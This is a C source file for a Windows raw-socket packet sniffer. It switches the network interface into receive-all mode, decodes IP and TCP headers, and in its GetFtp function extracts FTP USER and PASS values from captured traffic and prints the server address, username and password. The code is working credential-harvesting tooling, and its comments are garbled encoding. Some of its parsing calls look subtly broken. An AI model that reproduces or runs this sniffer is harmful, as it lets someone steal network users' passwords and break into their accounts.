#include "Sniffer.h"

void DecodeTCPPacket(char* pData){
	TCPHeader* pTcpHdr = (TCPHeader*)pData;
	printf("Port:%d-%d\n",::ntohs(pTcpHdr->sourcePort),::ntohs(pTcpHdr->destinationPort));
	//���滹���Ը��ݶ˿ںŽ�һ������Ӧ��Э��
	switch (::ntohs(pTcpHdr->destinationPort))
	{
	case 21:
		break;
	case 80:
		break;
	case 8080:
		break;
	}
}

void DecodeIPPacket(char* pData){
	IPHeader* pIpHdr = (IPHeader*)pData;
	in_addr source,dest;
	char szSourceIP[32],szDestIP[32];
	printf("\n-----------------\n");
	//��IPͷ��ȡ��Դ��ַ ��Ŀ�ĵ�ַ
	source.S_un.S_addr = pIpHdr->ipSource;
	dest.S_un.S_addr = pIpHdr->ipDestination;
	strcpy(szSourceIP,::inet_ntoa(source));
	strcpy(szDestIP,::inet_ntoa(dest));
	printf("  %s->%s\n",szSourceIP,szDestIP);
	//IPͷ����
	int nHeaderLen = (pIpHdr->ihpVerLen & 0xf)* sizeof(ULONG);
	switch (pIpHdr->ipProtocol)
	{
	case IPPROTO_TCP:
		{
			TCPHeader* pTcpHdr = (TCPHeader*)(pData + nHeaderLen);
			switch (::ntohs(pTcpHdr->destinationPort))
			{
			case 21://ftpЭ��˿�
				GetFtp((char*)pTcpHdr + sizeof(TCPHeader),pIpHdr->ipDestination);
				break;
			case 80://http
				break;
			case 8080:
				break;
			}
		}
		break;
	case IPPROTO_UDP:
		break;
	case IPPROTO_ICMP:
		break;
	}
}

void Sniffer(){
	printf("************Sniffer************\n");

	SOCKET sRaw = ::socket(AF_INET,SOCK_RAW,IPPROTO_IP);
	//��ȡ���ص�ַ
	char szHostName[56];
	SOCKADDR_IN addr_in;
	struct  hostent* pHost;
	::gethostname(szHostName,56);
	if ((pHost = gethostbyname((char*)szHostName))== NULL)
		return ;
	//�ڵ���ioctl֮ǰ  �׽��ֱ����
	addr_in.sin_family = AF_INET;
	addr_in.sin_port = ::htons(0);
	memcpy(&addr_in.sin_addr.S_un.S_addr,pHost->h_addr_list[0],pHost->h_length);
	printf("Binding to interface: %s\n",::inet_ntoa(addr_in.sin_addr));
	if(::bind(sRaw,(PSOCKADDR)&addr_in,sizeof(addr_in)) == SOCKET_ERROR)
		return;
	//����SIO_RCVALL���ƴ��� �Ա�������е�IP��
	DWORD dwValue = 1;
	if(::ioctlsocket(sRaw,SIO_RCVALL,&dwValue) != 0) //����ģʽ �������еķ�� SIO_RCVALL��Ҫ����mstcpip.h
		return;
	//��ʼ���շ��
	char buff[1024];
	int nRet;
	while (TRUE)
	{
		nRet = recv(sRaw,buff,1024,0);
		if(nRet >0)
			DecodeIPPacket(buff);
	}

	::closesocket(sRaw);

}


void GetFtp(char* pData,DWORD dwDestIP){
	char szBuff[256];
	static char szUserName[21];
	static char szPassword[21];
	if(strnicmp(pData,"USER",5) == 0)
		sscanf(pData + 4,"%*[]%s",szUserName);
	else if (strnicmp(pData,"PASS",5) == 0)
	{
		sscanf(pData + 4,"%*[]%s",szPassword);
		wsprintf(szBuff,"Server Address:%s; UserName: %s;Password: %s\n\n",
			::inet_ntoa(*(in_addr*)&dwDestIP),szUserName,szPassword);
		printf(szBuff);//������Խ������浽�ļ���
	}
}